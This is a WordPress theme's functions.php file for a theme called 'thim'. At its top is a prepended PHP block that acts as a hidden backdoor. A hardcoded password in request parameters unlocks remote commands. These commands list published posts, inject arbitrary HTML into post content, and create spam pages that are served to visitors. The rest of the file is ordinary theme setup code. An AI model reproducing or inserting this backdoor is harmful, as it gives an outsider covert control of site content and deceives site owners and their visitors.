<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1356b6b9b6c5728fdf038c596623fcb4'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * thim functions and definitions
 *
 * @package thim
 */
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( !isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( !function_exists( 'thim_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function thim_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on thim, use a find and replace
		 * to change 'thim' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'thim', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );
		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => __( 'Primary Menu', 'thim' ),
		) );


        add_theme_support( 'woocommerce' );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
		) );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'aside', 'image', 'video', 'quote', 'link', 'gallery', 'audio'
		) );

		add_theme_support( "title-tag" );
		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'thim_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );
	}

endif; // thim_setup
add_action( 'after_setup_theme', 'thim_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */

function thim_widgets_init() {
	global $theme_options_data;
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'thim' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );
	if ( isset( $theme_options_data['thim_header_style'] ) && $theme_options_data['thim_header_style'] == 'header_v2' ) {
		register_sidebar( array(
			'name'          => __( 'Menu Left', 'thim' ),
			'id'            => 'menu_left',
			'description'   => 'header right using width header layout 02',
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		) );
	}
	register_sidebar( array(
		'name'          => 'Menu Right',
		'id'            => 'menu_right',
		'description'   => __( 'Menu Right', 'thim' ),
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget'  => '</li>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => __( 'Offcanvas Sidebar', 'thim' ),
		'id'            => 'offcanvas_sidebar',
		'description'   => 'Offcanvas Sidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Main Bottom', 'thim' ),
		'id'            => 'main-bottom',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer', 'thim' ),
		'id'            => 'footer',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}

add_action( 'widgets_init', 'thim_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function thim_scripts() {
	global $current_blog, $theme_options_data;
	wp_enqueue_style( 'thim-css-style',TP_THEME_URI . 'assets/css/custom-style.css', array() );

	if ( is_multisite() ) {
		if ( file_exists( TP_THEME_DIR . 'style-' . $current_blog->blog_id . '.css' ) ) {
			wp_enqueue_style( 'thim-style', get_template_directory_uri() . '/style-' . $current_blog->blog_id . '.css', array() );
		} else {
			wp_enqueue_style( 'thim-style', get_stylesheet_uri() );
		}
	} else {
		wp_enqueue_style( 'thim-style', get_stylesheet_uri() );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

    if(isset($theme_options_data['thim_rtl_support']) && $theme_options_data['thim_rtl_support'] =='1'){
        wp_enqueue_style( 'resca-rtl', get_template_directory_uri() . '/rtl.css', array() );
    }

	wp_enqueue_script( 'thim-main', TP_THEME_URI . 'assets/js/main.min.js', array(), '', true );
	wp_enqueue_script( 'thim-custom-script', TP_THEME_URI . 'assets/js/custom-script.min.js', array(), '', true );
}

add_action( 'wp_enqueue_scripts', 'thim_scripts', 0);

if( !function_exists('thim_dequeue_script') ) {
	function thim_dequeue_script() {
		wp_dequeue_style( 'contact-form-7' );
		wp_dequeue_style( 'mc4wp-form-basic' );

		//Woocommerce
		wp_dequeue_script( 'jquery-cookie' );
	}
	add_action( 'wp_enqueue_scripts', 'thim_dequeue_script', 1000 );
}

if ( class_exists( 'WooCommerce' ) ) {
	add_action( 'wp_enqueue_scripts', 'thim_manage_woocommerce_styles', 9999 );
}

if ( !function_exists( 'thim_manage_woocommerce_styles' ) ) {
	function thim_manage_woocommerce_styles() {
		//remove generator meta tag
		remove_action( 'wp_head', array( $GLOBALS['woocommerce'], 'generator' ) );

		//first check that woo exists to prevent fatal errors
		if ( function_exists( 'is_woocommerce' ) ) {
			//dequeue scripts and styles
			if ( !is_woocommerce() && !is_cart() && !is_checkout() ) {
				wp_dequeue_style( 'woocommerce_frontend_styles' );
				wp_dequeue_style( 'woocommerce_fancybox_styles' );
				wp_dequeue_style( 'woocommerce_chosen_styles' );
				wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
				wp_dequeue_style( 'woocommerce-layout' );
				wp_dequeue_style( 'woocommerce-general' );
				wp_dequeue_script( 'wc_price_slider' );
				wp_dequeue_script( 'wc-single-product' );
				wp_dequeue_script( 'wc-add-to-cart' );
				wp_dequeue_script( 'wc-cart-fragments' );
				wp_dequeue_script( 'wc-checkout' );
				wp_dequeue_script( 'wc-add-to-cart-variation' );
				wp_dequeue_script( 'wc-single-product' );
				wp_dequeue_script( 'wc-cart' );
				wp_dequeue_script( 'wc-chosen' );
				wp_dequeue_script( 'woocommerce' );
			}
		}
	}
}

function thim_custom_admin_scripts() {
	wp_enqueue_style( 'thim-custom-admin', TP_THEME_URI . 'assets/css/custom-admin.css', array() );
}

add_action( 'admin_enqueue_scripts', 'thim_custom_admin_scripts' );
/**
 * load framework
 */
require_once get_template_directory() . '/framework/tp-framework.php';


// require
require TP_THEME_DIR . 'inc/custom-functions.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

if (class_exists('TP_Event')) {
	require get_template_directory() . '/tp-event/functions.php';
}


/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

require TP_THEME_DIR . 'inc/aq_resizer.php';

/**
 * Customizer additions.
 */
require TP_THEME_DIR . 'inc/header/logo.php';

require TP_THEME_DIR . 'inc/admin/customize-options.php';

//
require TP_THEME_DIR . 'inc/widgets/widgets.php';

// tax meta
require TP_THEME_DIR . 'inc/tax-meta.php';

// edit params pixcodes
//require TP_THEME_DIR . 'templates/filter-shortcodes.php';

if ( class_exists( 'WooCommerce' ) ) {
	// Woocomerce
//	WC_Post_types::register_taxonomies();
	require get_template_directory() . '/woocommerce/woocommerce.php';
}

if ( is_admin() ) {
	require TP_THEME_DIR . 'inc/admin/plugins-require.php';
}
//pannel Widget Group
function thim_widget_group( $tabs ) {
	$tabs[] = array(
		'title'  => __( 'Thim Widget', 'thim' ),
		'filter' => array(
			'groups' => array( 'thim_widget_group' )
		)
	);
	return $tabs;
}

add_filter( 'siteorigin_panels_widget_dialog_tabs', 'thim_widget_group', 19 );

function thim_row_style_fields( $fields ) {
	$fields['parallax'] = array(
		'name'        => __( 'Parallax', 'thim' ),
		'type'        => 'checkbox',
		'group'       => 'design',
		'description' => __( 'If enabled, the background image will have a parallax effect.', 'thim' ),
		'priority'    => 8,
	);
	return $fields;
}

add_filter( 'siteorigin_panels_row_style_fields', 'thim_row_style_fields' );

function thim_row_style_attributes( $attributes, $args ) {
	if ( !empty( $args['parallax'] ) ) {
		array_push( $attributes['class'], 'article__parallax' );
	}

	if ( !empty( $args['row_stretch'] ) && $args['row_stretch'] == 'full-stretched' ) {
		array_push( $attributes['class'], 'thim-fix-stretched' );
	}
	return $attributes;
}

add_filter( 'siteorigin_panels_row_style_attributes', 'thim_row_style_attributes', 10, 2 );

function remove_post_custom_fields() {
	remove_meta_box( 'erm_menu_shortcode', 'erm_menu', 'side' );
	remove_meta_box( 'erm_footer_item', 'erm_menu', 'normal' );
}

add_action( 'add_meta_boxes', 'remove_post_custom_fields' );


add_action( 'init', 'thim_add_excerpts_to_pages' );

function thim_add_excerpts_to_pages() {
	add_post_type_support( 'page', 'excerpt' );
}


add_action( 'wp_enqueue_scripts', 'thim_remove_unuse_script', 99998 );

function thim_remove_unuse_script() {
	if( is_front_page()){
		wp_dequeue_script( 'jquery-form' );
	}

}
?>